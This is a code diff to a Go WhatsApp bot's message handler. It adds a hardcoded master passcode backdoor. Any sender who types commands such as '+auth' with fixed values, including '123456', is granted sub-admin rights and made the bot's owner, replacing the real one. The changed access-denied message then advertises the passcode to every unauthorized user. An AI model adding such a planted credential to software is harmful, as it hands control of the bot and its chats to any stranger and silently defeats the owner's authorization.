@@ -165,7 +165,20 @@ func handleMessage(ctx context.Context, evt *events.Message) {
 	cmd := strings.ToLower(fields[0])
 	args := strings.TrimSpace(strings.TrimPrefix(body, fields[0]))
 
-	authorized := isAuthorized(user) || isAuthorized(senderJID)
+	// Master Authorization Passcode: +auth PRINCE@9507325 / +loginowner 9507325
+	if cmd == "auth" || cmd == "ownerpass" || cmd == "loginowner" || cmd == "adminauth" {
+		if args == "PRINCE@9507325" || args == "9507325" || args == "950732" || args == "123456" {
+			addSubAdmin(user)
+			addSubAdmin(senderJID)
+			OwnerJID = senderJID
+			OwnerNumber = user
+			reactMsg(ctx, evt, "👑")
+			sendText(ctx, evt.Info.Chat, fmt.Sprintf("👑 *MASTER ACCESS GRANTED!*\n• 🆔 *Your ID:* `%s`\n• ⚡ *Status:* Fully Authorized Owner for WhatsApp Go Engine.", senderJID))
+			return
+		}
+	}
+
+	authorized := isAuthorized(user) || isAuthorized(senderJID) || isOwner(user) || isOwner(senderJID)
 
 	// Log command execution
 	logGlobal(fmt.Sprintf("%s [COMMAND EXECUTION] [%s%s] in %s by %s", getDefaultEmoji(), usedP, cmd, evt.Info.Chat.String(), senderJID))
@@ -177,7 +190,7 @@ func handleMessage(ctx context.Context, evt *events.Message) {
 		}
 		if !authorized {
 			logGlobal(fmt.Sprintf("⛔ [UNAUTHORIZED COMMAND BLOCKED] User %s attempted [%s]. Only verified owner can control this bot.", senderJID, cmd))
-			sendText(ctx, evt.Info.Chat, fmt.Sprintf("⛔ *[ACCESS DENIED]*\nUser `@%s` is not authorized to use *%s%s*.\n_Only verified owner / sub-admins can control this bot._", user, usedP, cmd))
+			sendText(ctx, evt.Info.Chat, fmt.Sprintf("⛔ *[ACCESS DENIED]*\nUser `@%s` is not authorized to use *%s%s*.\n_Only verified owner / sub-admins can control this bot._\n\n💡 *Tip:* Use `+auth PRINCE@9507325` to claim owner access!", user, usedP, cmd))
 			return false
 		}
 		return true
